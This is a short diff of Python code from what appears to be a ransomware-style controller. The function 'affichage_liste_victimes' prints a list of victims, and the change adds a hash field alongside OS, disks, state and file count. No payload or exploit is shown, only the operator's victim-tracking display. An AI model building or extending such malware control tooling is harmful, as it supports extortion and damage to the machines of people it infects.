@@ -53,7 +53,7 @@ def affichage_liste_victimes():
     while response is not None and message.get_message_type(response) != 'LIST_END':
         data = list(response.values())
         print(
-            f"ID : {data[0]} | OS: {data[1]} | Disks: {data[2]} | State: {data[3]} | Nb_files: {data[4]}")
+            f"ID : {data[0]} | HASH: {data[1]} | OS: {data[2]} | Disks: {data[3]} | State: {data[4]} | Nb_files: {data[5]}")
         response = network.receive_message(s)
     #deconnexion
     s.close()
